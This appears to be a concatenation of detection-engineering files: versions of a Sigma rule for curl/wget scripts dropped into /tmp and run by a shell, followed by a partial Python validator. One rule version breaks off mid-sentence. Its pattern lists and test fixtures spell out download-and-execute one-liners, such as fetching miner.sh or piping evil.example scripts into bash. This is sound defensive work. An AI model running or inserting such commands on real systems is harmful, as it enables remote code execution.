# =============================================================================
# Sigma rule: curl/wget dropping a shell script into /tmp, then bash/sh running it
# Backend-agnostic (process_creation / Linux). Uses only widely supported
# modifiers (endswith, startswith, contains, contains|all) so it converts for
# Sysmon-for-Linux, auditd, Falco/CSOL, Elastic ECS, Splunk, Qualys etc.
# =============================================================================
title: Malicious Payload Download and Execution via curl or wget to Temp Directory
id: 3f2a1c94-8d5b-4f6e-9a72-5c1d8e4b7a06
related:
    - id: 5b4a3c2d-1e6f-4a8b-9c0d-7e8f9a0b1c2d   # Generic "Suspicious Sh Process from Temp" (community)
      type: similar
    - id: 8c1f0e77-2b49-4d3a-a15e-6f9b0c2d4e88   # "Suspicious Curl Process Start" (community)
      type: similar
status: experimental
authors:
    - Security Detection Engineering
date: '2026-10-26'
modified: '2026-10-26'
description: |
    Detects the classic Linux delivery/execution chain in which a file transfer
    utility (curl, wget) writes a shell script into a world-writable temporary
    directory (/tmp, /var/tmp, /dev/shm, /home/*/tmp) and that script is then
    executed by a POSIX shell (sh, bash, dash, ksh, zsh, busybox sh).

    The rule fires on either half of the chain, so both the write and the
    execution are surfaced even when the attacker splits them across separate
    processes (e.g. "curl http://host/x.sh -o /tmp/x.sh" as one event and
    "bash /tmp/x.sh" as the next), or performs them in a single one-liner
    (e.g. "curl -fsSL http://host/x.sh | bash").

    Detection coverage:
      1. curl/wget with an explicit output target inside a temp directory
         (-o, -O, --output, -P, shell redirection, tee) where a .sh/.bash
         script name is present.
      2. A shell process whose command line references a file in a temp
         directory (direct execution, "sh -c /tmp/...", "bash -c \"...\"").
      3. Shell-token adjacency patterns ("sh /tmp/x.sh", 'sh -c "/tmp/x.sh"',
         "exec /tmp/x.sh", "source /tmp/x.sh") that also catch the parent
         shell executing a staged temp script in a one-liner.

    Note: single-event detection cannot prove the causal link between the
    download and the execution; correlate the two events on host + file path
    (TargetFilename / CommandLine) within a short time window to raise
    confidence, and pivot on the source URL / hash of the dropped file.
references:
    - https://attack.mitre.org/techniques/T1105/
    - https://attack.mitre.org/techniques/T1059/004/
    - https://attack.mitre.org/techniques/T1036/007/
tags:
    - attack.execution
    - attack.command_and_control
    - attack.defense_evasion
    - attack.t1059.004
    - attack.t1105
    - attack.t1036.007
logsource:
    product: linux
    category: process_creation
detection:
    # --- 1. File transfer utility -------------------------------------------
    selection_dl_tool:
        - Image|endswith:
              - '/curl'
              - '/wget'
              - '/wget2'
              - '/http'
        - CommandLine|contains:
              - 'curl'
              - 'wget'
    # ... writing its output into a temp directory
    selection_dl_tmp_out:
        CommandLine|contains:
            - '-o /tmp/'
            - '-o/var/tmp/'
            - '-o /var/tmp/'
            - '-o/tmp/'
            - '-o /dev/shm/'
            - '-o/dev/shm/'
            - '-O /tmp/'
            - '-O/tmp/'
            - '-O /var/tmp/'
            - '-O /dev/shm/'
            - '--output /tmp/'
            - '--output=/tmp/'
            - '--output=/var/tmp/'
            - '--output=/dev/shm/'
            # curl -O --directory-prefix / -P puts the file in a chosen dir
            - '-P /tmp/'
            - '-P/tmp/'
            - '--directory-prefix /tmp/'
            - '--directory-prefix=/tmp/'
            - '-O --directory-prefix /tmp/'
            # shell redirection / piping through tee into a temp file
            - '> /tmp/'
            - '>/tmp/'
            - '>>/tmp/'
            - '> /var/tmp/'
            - '> /dev/shm/'
            - 'tee /tmp/'
            - 'tee -a /tmp/'
            - 'tee /var/tmp/'
            - 'tee /dev/shm/'
    # ... and that output is a shell script
    selection_dl_script_ext:
        CommandLine|contains:
            - '.sh'
            - '.bash'
            - '.ksh'
            - '.zsh'
    # --- 2. Shell executing a staged file from a temp directory --------------
    selection_exec_shell:
        Image|endswith:
            - '/bash'
            - '/sh'
            - '/dash'
            - '/ash'
            - '/ksh'
            - '/zsh'
            - '/csh'
            - '/tcsh'
            - '/busybox'
    selection_exec_tmp_arg:
        CommandLine|contains:
            - ' /tmp/'
            - '"/tmp/'
            - "'/tmp/"
            - '=/tmp/'
            - '>/tmp/'
            - '>>/tmp/'
            - ' /var/tmp/'
            - '"/var/tmp/'
            - ' /dev/shm/'
            - '"/dev/shm/'
            - '/tmp/.hidden'
    selection_exec_tmp_script_ext:
        CommandLine|contains:
            - '.sh'
            - '.bash'
            - '.ksh'
            - '.zsh'
    # Shell token immediately followed by a temp path: also matches the parent
    # shell of a one-liner such as: bash -c "curl ... -o /tmp/a.sh; bash /tmp/a.sh"
    selection_exec_adjacent:
        CommandLine|contains:
            - 'sh /tmp/'
            - 'sh /var/tmp/'
            - 'sh /dev/shm/'
            - 'sh -c /tmp/'
            - 'sh -c "/tmp/'
            - "sh -c '/tmp/"
            - 'sh -e /tmp/'
            - 'sh -x /tmp/'
            - 'sh -i /tmp/'
            - 'sh -l /tmp/'
            - 'sh -s /tmp/'
            - 'sh "/tmp/'
            - "sh '/tmp/"
            - 'exec /tmp/'
            - 'source /tmp/'
            - '. /tmp/'
    # --- Filters: benign infrastructure that legitimately touches temp files --
    filter_benign_tmp_paths:
        CommandLine|contains:
            - '/tmp/.mount_'
            - '/tmp/.X11-unix'
            - '/tmp/.font-unix'
            - '/tmp/systemd-private-'
            - '/tmp/systemd-coredump'
            - '/tmp/snap-private-tmp'
            - '/tmp/snap.'
            - '/tmp/xdg-'
            - '/tmp/.ICE-unix'
            - '/tmp/.git-credential'
    filter_package_manager:
        Image|endswith:
            - '/apt-get'
            - '/apt'
            - '/dpkg'
            - '/yum'
            - '/dnf'
            - '/zypper'
            - '/pacman'
            - '/rpm'
            - '/snap'
            - '/flatpak'
    condition: >
        (
            (selection_dl_tool and selection_dl_tmp_out and selection_dl_script_ext)
            or (selection_exec_shell and selection_exec_tmp_arg and selection_exec_tmp_script_ext)
            or (selection_exec_shell and selection_exec_adjacent)
            or selection_exec_adjacent
        )
        and not 1 of filter_*
falsepositives:
    - Legitimate installer/bootstrap scripts that self-document to /tmp and are
      executed with bash (e.g. vendor "curl ... -o /tmp/install.sh && bash
      /tmp/install.sh" quick-start instructions, NodeSource, Docker, Ansible
      bootstrap, cloud-init / user-data scripts, kickstart/preseed %post steps)
    - CI/CD runners, container image builds and config-management tools
      (Ansible, Salt, Puppet, Chef, Terraform provisioners) that stage helper
      scripts in /tmp before executing them
    - Security/monitoring agents and update daemons fetching signed payloads
      into temp directories
    - Developers and engineers running ad-hoc scripts out of /tmp during testing
level: medium
fieldMappings:
    - name: Image
      target:
        default: Image
        auditd: exe
        ecs: process.executable
    - name: CommandLine
      target:
        default: CommandLine
        auditd: cmdline
        ecs: process.command_line

args.content:
title: Malicious File Download and Execution via curl or wget to /tmp
id: 98d56551-6f2f-4d95-9506-0edefe6da3ba
status: experimental
description: |
  Detects the common attacker "download and run" pattern on Linux hosts:
  a transfer tool (curl, wget, and similar such as nc, scp, sftp, rsync, lynx,
  w3m, or a bash /dev/tcp redirect) writing a shell script into /tmp (or the
  /var/tmp, /dev/shm, /home/<user> drop directories), and/or a shell
  (bash, sh, dash, zsh, ksh) subsequently executing a script from one of those
  world-writable directories.

  Phase 1 (download_and_write) - a transfer process has an output redirection
  to a *.sh file in a world-writable directory, or uses curl -o/--output or
  wget -O/--output-document to write a *.sh file there.
  Phase 2 (shell_exec_from_tmp) - a shell is spawned with a script located in
  one of those directories as an argument, optionally preceded by chmod +x or
  an in-place base64 decode.

  Both phases are correlated with `condition: download_and_write or
  shell_exec_from_tmp` so each event is alerted on individually; triage should
  correlate the two events by host and parent/child process lineage within a
  short time window (a typical attack chain completes in seconds).

  Expected false positives: provisioning and configuration-management tools
  (cloud-init, Ansible, Salt, Puppet, Chef), container/VM entrypoint scripts,
  vendor installer bundles and CI/CD runners that unpack helper scripts into
  temporary directories. Validate the parent process chain and the script
  content before escalating, and add allow-list entries for known automation
  service accounts.
author: Security Detection Engineering
date: 2026-10-26
modified: 2026-10-26
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1222/002/
tags:
  - attack.command_and_control
  - attack.t1105
  - attack.execution
  - attack.t1059.004
  - attack.defense_evasion
  - attack.t1222.002
logsource:
  category: process_creation
  product: linux
detection:
  # ------------------------------------------------------------------ #
  # Shared building blocks                                              #
  # ------------------------------------------------------------------ #
  selection_shell:
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
      - '/zsh'
      - '/ksh'
      - '/ash'
    CommandLine|contains: ' '
  selection_tmp_path:
    CommandLine|contains:
      - '/tmp/'
      - '/var/tmp/'
      - '/dev/shm/'
      - '/run/user/'
      - '/home/'
  selection_script_ext:
    CommandLine|contains:
      - '.sh'
      - '.bash'
      - '.ksh'
      - '.zsh'
  # ------------------------------------------------------------------ #
  # Phase 1: transfer tool writing a shell script into a temp directory #
  # ------------------------------------------------------------------ #
  selection_transfer_tool:
    Image|endswith:
      - '/curl'
      - '/wget'
      - '/nc'
      - '/ncat'
      - '/netcat'
      - '/scp'
      - '/sftp'
      - '/rsync'
      - '/lynx'
      - '/w3m'
      - '/aria2c'
      - '/axel'
      - '/http'
  selection_write_tmp_script:
    CommandLine|contains:
      # shell output redirection: curl http://x/a.sh > /tmp/a.sh
      - '> /tmp/'
      - '>/tmp/'
      - '>>/tmp/'
      - '>&/tmp/'
      - '> /var/tmp/'
      - '>/var/tmp/'
      - '> /dev/shm/'
      - '>/dev/shm/'
      - '> /home/'
      - '>/home/'
      # explicit output-document switches: curl -o /tmp/a.sh / wget -O /tmp/a.sh
      - '-o /tmp/'
      - '--output /tmp/'
      - '-o/tmp/'
      - '-o /var/tmp/'
      - '--output /var/tmp/'
      - '-O /tmp/'
      - '--output-document=/tmp/'
      - '--output-document /tmp/'
      - '-O/tmp/'
      - '-O /var/tmp/'
      - '--output-document=/var/tmp/'
      - '-O /dev/shm/'
      - '--output-document=/dev/shm/'
      - '-O /home/'
      - '--output-document=/home/'
  # curl ... | tee /tmp/x.sh  /  ... | base64 -d > /tmp/x.sh  (obfuscated write)
  selection_pipe_write:
    CommandLine|contains:
      - '| tee /tmp/'
      - '|tee /tmp/'
      - '| sudo tee /tmp/'
      - '| base64 -d >/tmp/'
      - '|base64 -d>/tmp/'
      - '| base64 --decode >/tmp/'
      - '| sh -c "cat > /tmp/'
      - "sh -c 'cat > /tmp/"
      - 'bash -c "echo '
      - 'bash -c "printf '
      - 'echo '
  selection_pipe_decode:
    CommandLine|contains|all:
      - 'base64'
      - '/tmp/'
  filter_known_admin:
    User:
      - 'root'
  # ------------------------------------------------------------------ #
  # Phase 2: shell executing a script from a temp directory             #
  # ------------------------------------------------------------------ #
  selection_exec_invocation:
    CommandLine|contains:
      - ' /tmp/'
      - '/tmp/'
      - ' /var/tmp/'
      - '/var/tmp/'
      - ' /dev/shm/'
      - '/dev/shm/'
      - ' /run/user/'
      - ' /home/'
  selection_exec_ext:
    CommandLine|contains|all:
      - '.sh'
      - '/tmp/'
  selection_exec_ext_alt:
    CommandLine|contains|all:
      - '.sh'
      - '/var/tmp/'
  selection_exec_ext_shm:
    CommandLine|contains|all:
      - '.sh'
      - '/dev/shm/'
  # bash /tmp/x.sh | bash -c "$(curl ...)" | sh ./x.sh | bash -x /tmp/x.sh
  selection_exec_inline:
    CommandLine|contains:
      - 'bash -c "curl '
      - 'bash -c "wget '
      - 'bash -c $(curl '
      - "sh -c $(curl "
      - 'sh -c "curl '
      - 'bash <(curl '
      - 'sh <(curl '
      - 'bash <(wget '
      - 'sh <(wget '
      - '| sh'
      - '|sh'
      - '| bash'
      - '|bash'
      - '| zsh'
  # chmod +x /tmp/x.sh && /tmp/x.sh  (execution preparation, T1222.002)
  selection_chmod:
    Image|endswith: '/chmod'
    CommandLine|contains|all:
      - '+x'
      - '/tmp/'
  selection_chmod_alt:
    Image|endswith: '/chmod'
    CommandLine|contains|all:
      - '777'
      - '/tmp/'
  filter_shell_interactive:
    ParentImage|endswith:
      - '/bash'
      - '/sh'
      - '/zsh'
    CommandLine|re: '^\s*(bash|sh|dash|zsh|ksh)\s*$'
  condition: download_and_write or shell_exec_from_tmp or inline_pipe_exec or chmod_staged_script
  download_and_write:
    selection_transfer_tool and selection_write_tmp_script and selection_script_ext
  shell_exec_from_tmp:
    selection_shell and selection_tmp_path and selection_script_ext and selection_exec_invocation and not filter_shell_interactive
  inline_pipe_exec:
    selection_shell and selection_exec_inline and not filter_shell_interactive
  chmod_staged_script:
    selection_chmod or selection_chmod_alt
falsepositives:
  - Cloud-init, user-data and cloud provider agent scripts that unpack helpers into /tmp or /var/tmp
  - Configuration management agents (Ansible, SaltStack, Puppet, Chef, Terraform provisioners)
  - Container image entrypoint and Kubernetes init scripts writing to /tmp or /dev/shm
  - Software installers and vendor upgrade bundles that stage helper scripts in temporary directories
  - CI/CD runner jobs (GitLab Runner, Jenkins, GitHub Actions) that generate and run build scripts
  - Developers and administrators manually downloading and running install scripts (for example package manager bootstrap one-liners)
level: high
tags_note: see tags field

title: Malicious File Download and Execution via curl or wget to /tmp
id: 98d56551-6f2f-4d95-9506-0edefe6da3ba
related:
  - id: 9e23f4d3-4e1f-4a5c-8f1a-c7b0f0a2b3c1
    type: similar
status: experimental
description: |
  Detects the classic attacker "download then run" chain on Linux hosts: a
  transfer tool (curl, wget and equivalents such as nc/ncat, scp, sftp, rsync,
  aria2c, axel, lynx, w3m) writing a shell script into a world-writable staging
  directory (/tmp, /var/tmp, /dev/shm, /run/user), followed by a shell
  (bash, sh, dash, zsh, ksh, ash) executing a script from that same directory.

  The rule covers four behaviours that make up the chain:
    1. download_write_script  - transfer tool redirecting (-o/-O/--output or a
       shell redirection such as > /tmp/x.sh) a *.sh payload into a staging dir.
    2. shell_exec_staged_script - a shell process launched with a *.sh file that
       lives in a staging directory as its argument.
    3. inline_pipe_exec - the fileless variant of the same intent, where the
       downloaded body is piped straight into a shell
       (curl http://host/a.sh | bash, bash <(curl ...), bash -c "$(curl ...)"),
       or a base64 blob is decoded into a staging dir and executed.
    4. chmod_staged_script - the staging step (chmod +x / chmod 777 on a file in
       /tmp) that immediately precedes execution, mapped to T1222.002.

  Each event is alerted on on its own; for triage, correlate events from the
  same host and process lineage within a short window (a few seconds), because
  phases 1 and 2 are two distinct process-creation events of one attack chain.

  Coverage note: this rule relies on process-creation telemetry that records the

#!/usr/bin/env python3
"""
Validator for the Sigma rule /workspace/rules/malicious_download_exec.yml

Checks performed
  1. YAML parses (strict loader that also rejects duplicate mapping keys).
  2. Required Sigma metadata fields present and well formed (UUID, dates,
     enums, MITRE tag syntax, list types).
  3. detection block: logsource present, condition present, every identifier
     referenced by the condition exists, and every defined identifier is used.
  4. Modifiers used are from the supported set.
  5. Functional test: a small Sigma expression engine evaluates the rule
     against sample process_creation events (known-good / known-bad).
"""
import re
import sys
import uuid
import yaml

RULE = "/workspace/rules/malicious_download_exec.yml"
ALLOWED_LEVELS = {"informational", "low", "medium", "high", "critical"}
ALLOWED_STATUS = {"stable", "test", "experimental", "deprecated", "unsupported"}
ALLOWED_MODIFIERS = {"contains", "startswith", "endswith", "all", "re", "regex",
                     "fieldref", "gt", "lt", "gte", "lte", "base64", "base64offset",
                     "wide", "windash", "cidr", "startswith", "exists"}
REQUIRED_TOP = ["title", "id", "status", "description", "date", "modified",
                "references", "tags", "author", "logsource", "detection",
                "falsepositives", "level"]


class StrictLoader(yaml.SafeLoader):
    """SafeLoader that raises on duplicate keys in the same mapping."""


def _no_dup_constructor(loader, node, deep=False):
    mapping = {}
    for key_node, value_node in node.value:
        key = loader.construct_object(key_node, deep=deep)
        if key in mapping:
            raise yaml.YAMLError(
                f"duplicate key {key!r} at line {key_node.start_mark.line + 1}")
        mapping[key] = loader.construct_object(value_node, deep=deep)
    return mapping


StrictLoader.add_constructor(yaml.resolver.BaseResolver.DEFAULT_MAPPING_TAG,
                             _no_dup_constructor)

failures, warnings = [], []


def check(cond, msg):
    if cond:
        print(f"  [PASS] {msg}")
    else:
        print(f"  [FAIL] {msg}")
        failures.append(msg)


def warn(cond, msg):
    if not cond:
        print(f"  [WARN] {msg}")
        warnings.append(msg)


# ---------------------------------------------------------------- 1. YAML ----
print("== 1. YAML syntax ==")
raw = open(RULE, encoding="utf-8").read()
try:
    doc = yaml.load(raw, Loader=StrictLoader)
    print("  [PASS] YAML parses with strict (no-duplicate-key) loader")
except yaml.YAMLError as exc:
    print(f"  [FAIL] YAML error: {exc}")
    sys.exit(1)
check(isinstance(doc, dict), "top level is a mapping")
check("tags_note" not in doc, "no stray/unknown top-level keys")

# ------------------------------------------------------------- 2. metadata ---
print("== 2. Sigma metadata ==")
for field in REQUIRED_TOP:
    check(field in doc, f"required field '{field}' present")
try:
    uuid.UUID(str(doc["id"]))
    print(f"  [PASS] id is a valid UUID ({doc['id']})")
except ValueError as exc:
    check(False, f"id is a valid UUID: {exc}")
for d in ("date", "modified"):
    check(bool(re.fullmatch(r"\d{4}-\d{2}-\d{2}", str(doc.get(d, "")))),
          f"{d} is YYYY-MM-DD")
check(doc.get("level") in ALLOWED_LEVELS, f"level is a valid enum ({doc.get('level')})")
check(doc.get("status") in ALLOWED_STATUS, f"status is a valid enum ({doc.get('status')})")
check(isinstance(doc.get("references"), list)
      and all(str(u).startswith(("http://", "https://")) for u in doc.get("references", [])),
      "references is a list of URLs")
check(isinstance(doc.get("falsepositives"), list) and doc.get("falsepositives"),
      "falsepositives is a non-empty list")
tags = doc.get("tags", [])
check(isinstance(tags, list) and tags, "tags is a non-empty list")
check(all(re.fullmatch(r"(attack|car|detection|evaluation|general|threat)\.[a-z0-9_.]+", t)
          for t in tags), f"all tags are namespaced: {tags}")
tactics = [t for t in tags if re.fullmatch(r"attack\.t\d{4}(\.\d{3})?", t)]
check(len(tactics) >= 1, "at least one MITRE technique tag")

# ----------------------------------------------------------- 3. logsource ----
print("== 3. logsource ==")
ls = doc.get("logsource", {})
check(ls.get("product") == "linux", "logsource.product == linux")
check(ls.get("category") == "process_creation", "logsource.category == process_creation")

# ----------------------------------------------------------- 4. detection ----
print("== 4. detection block ==")
det = doc.get("detection", {})
check("condition" in det, "detection.condition present")
condition = det.get("condition")
check(isinstance(condition, str) or isinstance(condition, list),
      "condition is a string or list of strings")
cond_str = " ".join(condition) if isinstance(condition, list) else " ".join(str(condition).split())
cond_str = re.sub(r"\s+", " ", cond_str).strip()

identifiers = [k for k in det if k != "condition"]
check(all(i.startswith(("selection_", "filter_", "keyword_")) or i in
          ("download_write_script", "shell_exec_staged_script", "inline_pipe_exec",
           "chmod_staged_script") for i in identifiers),
      "search identifiers are prefixed / named consistently")

# modifiers
bad_mods = set()
for name, body in det.items():
    if name == "condition" or not isinstance(body, dict):
        continue
    for key in body:
        for mod in str(key).split("|")[1:]:
            if mod not in ALLOWED_MODIFIERS:
                bad_mods.add(f"{name}: {mod}")
check(not bad_mods, f"only supported modifiers used{'' if not bad_mods else ' -> ' + str(sorted(bad_mods))}")

# every selector value non-empty
empty = [n for n, b in det.items() if isinstance(b, dict)
         and any((isinstance(v, (list, str, dict)) and not v) for v in b.values())]
check(not empty, f"no empty selector values{'' if not empty else ' -> ' + str(empty)}")

# ------------------------------------------------- 5. condition consistency --
print("== 5. condition <-> identifier consistency ==")
tokens = set(re.findall(r"[a-zA-Z_][a-zA-Z0-9_]*", cond_str))
referenced = tokens - {"and", "or", "not", "of", "1", "all", "any"}
undefined = sorted(referenced - set(identifiers))
check(not undefined, f"condition references only defined identifiers{'' if not undefined else ' -> ' + str(undefined)}")
unused = sorted(set(identifiers) - referenced)
check(not unused, f"every defined identifier is used by the condition{'' if not unused else ' -> ' + str(unused)}")
check(any(i.startswith("filter_") for i in identifiers), "at least one filter_* (noise reduction)")

# ------------------------------------------------ 6. mini sigma evaluation ---
print("== 6. functional evaluation ==")


def match(mods, pattern, value):
    value = "" if value is None else str(value)
    if "re" in mods or "regex" in mods:
        return re.search(pattern, value) is not None
    if "endswith" in mods:
        return value.endswith(pattern)
    if "startswith" in mods:
        return value.startswith(pattern)
    if "contains" in mods:
        return pattern in value
    return value == pattern


def sel_hit(body, event):
    """body: dict field|mods -> value(s).  All fields must match (AND);
    a list of values matches if any value matches (OR) unless |all."""
    for key, val in body.items():
        parts = str(key).split("|")
        field, mods = parts[0], parts[1:]
        if field not in event:
            return False
        patterns = val if isinstance(val, list) else [val]
        results = [any(match(mods, p, event[field]) for p in patterns)
                   if "all" not in mods else
                   all(any(match([m for m in mods if m != "all"], p, event[field])
                           for p in patterns))
                      for _ in [0]]
        if not results[0]:
            return False
    return True


ATOM = re.compile(r"\(|\)|\band\b|\bor\b|\bnot\b|[a-zA-Z_][a-zA-Z0-9_]*")


def evaluate(expr, event, cache, det):
    toks = ATOM.findall(expr)
    out, stack_ops = [], []
    for t in toks:
        if t in ("and", "or", "not"):
            stack_ops.append(t)
            out.append(t)
        elif t in ("(", ")"):
            out.append(t)
        else:
            if t in cache:
                out.append("true" if cache[t] else "false")
            else:
                body = det[t]
                if isinstance(body, dict):
                    cache[t] = sel_hit(body, event)
                else:  # named search combining other identifiers
                    cache[t] = evaluate(str(body), event, cache, det)
                out.append("true" if cache[t] else "false")
    py = " ".join(out)
    py = re.sub(r"\bnot\b", " not ", py)
    py = re.sub(r"\band\b", " and ", py)
    py = re.sub(r"\bor\b", " or ", py)
    py = re.sub(r"\s+", " ", py).strip()
    py = re.sub(r"\btrue\b", "True", py)
    py = re.sub(r"\bfalse\b", "False", py)
    return eval(py)  # noqa: S307 - expression built only from rule logic


def run(event):
    cache = {}
    return evaluate(cond_str, event, cache, det)


TP = [  # must be detected
    ("curl -s http://185.220.101.4/miner.sh -o /tmp/update.sh",
     {"Image": "/usr/bin/curl", "CommandLine": "curl -s http://185.220.101.4/miner.sh -o /tmp/update.sh",
      "ParentImage": "/bin/bash"}),
    ("wget -O /tmp/payload.sh http://evil.example/x.sh",
     {"Image": "/usr/bin/wget", "CommandLine": "wget -O /tmp/payload.sh http://evil.example/x.sh",
      "ParentImage": "/bin/sh"}),
    ("curl http://evil.example/a.sh > /tmp/a.sh",
     {"Image": "/usr/bin/curl", "CommandLine": "curl http://evil.example/a.sh > /tmp/a.sh",
      "ParentImage": "/bin/bash"}),
    ("bash /tmp/update.sh",
     {"Image": "/bin/bash", "CommandLine": "bash /tmp/update.sh", "ParentImage": "/usr/bin/curl"}),
    ("sh /var/tmp/.cache/run.sh",
     {"Image": "/usr/bin/dash", "CommandLine": "sh /var/tmp/.cache/run.sh", "ParentImage": "/bin/bash"}),
    ("bash -x /dev/shm/beacon.sh",
     {"Image": "/bin/bash", "CommandLine": "bash -x /dev/shm/beacon.sh", "ParentImage": "/usr/bin/make"}),
    ("curl -s http://evil.example/a.sh | bash",
     {"Image": "/usr/bin/curl", "CommandLine": "curl -s http://evil.example/a.sh | bash",
      "ParentImage": "/bin/bash"}),
    ("bash -c \"$(curl -s http://evil.example/x.sh)\"",
     {"Image": "/bin/bash", "CommandLine": 'bash -c "$(curl -s http://evil.example/x.sh)"',
      "ParentImage": "/usr/bin/nohup"}),
    ("chmod +x /tmp/update.sh",
     {"Image": "/usr/bin/chmod", "CommandLine": "chmod +x /tmp/update.sh", "ParentImage": "/bin/bash"}),
    ("echo <base64> | base64 -d > /tmp/x.sh",
     {"Image": "/usr/bin/curl", "CommandLine": "curl -s http://1.2.3.4/p | base64 -d > /tmp/p.sh",
      "ParentImage": "/bin/bash"}),
]
FP = [  # must NOT be detected
    ("interactive bash prompt", {"Image": "/bin/bash", "CommandLine": "bash",
                                 "ParentImage": "/usr/bin/ssh"}),
    ("curl to stdout, no file write", {"Image": "/usr/bin/curl",
                                       "CommandLine": "curl -s https://api.internal/v1/health",
                                       "ParentImage": "/usr/sbin/cron"}),
    ("curl json api call with headers", {"Image": "/usr/bin/curl",
